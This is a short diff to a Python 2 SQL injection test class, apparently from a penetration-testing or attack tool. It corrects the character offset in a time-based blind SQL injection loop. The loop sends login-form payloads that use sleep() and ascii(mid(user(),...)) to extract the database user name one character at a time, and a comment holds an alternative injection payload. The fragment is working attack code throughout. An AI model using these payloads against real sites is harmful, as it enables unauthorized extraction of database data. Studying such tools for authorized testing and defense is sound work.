@@ -520,7 +520,7 @@ class SqliTest(BaseConfig):
                             j + 30) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
                         # payload = "ddog123'&& SELECT if((select ascii(mid(user()," + repr(i) + ",1)))>" + repr(j) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                         if self.Data.PostTimeData(payload, self.time) == 0:
-                            user += chr(int(j))
+                            user += chr(int(j + 30))
                             break
                 logger.info("User sqli success...The user is %s" % user)
                 print "[*] user: %s" % user
